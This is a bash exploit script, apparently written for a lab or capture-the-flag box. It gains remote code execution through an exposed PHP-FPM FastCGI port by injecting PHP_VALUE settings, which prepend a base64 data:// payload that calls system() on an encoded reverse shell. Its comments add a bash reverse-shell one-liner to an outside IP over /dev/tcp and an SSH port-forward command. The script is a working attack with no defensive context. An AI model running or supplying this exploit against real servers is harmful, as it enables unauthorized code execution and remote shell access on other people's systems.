#!/bin/bash

# bash -c 'bash -i >&/dev/tcp/172.16.117.20/9999 0>&1
# ssh -N -L 0.0.0.0:9000:127.0.0.1:9000 andrew@192.168.157.191 -p 2222

PAYLOAD="<?php echo '<!--';system(base64_decode('<REVERSEEHLL_BASE64ENCODED>')); echo '-->';"
FILENAMES="/usr/local/www/apache24/data/info.php" # Exisiting file path
 
HOST=$1
B64=$(echo "$PAYLOAD"|base64)
 
for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT
 
    cat $OUTPUT
done
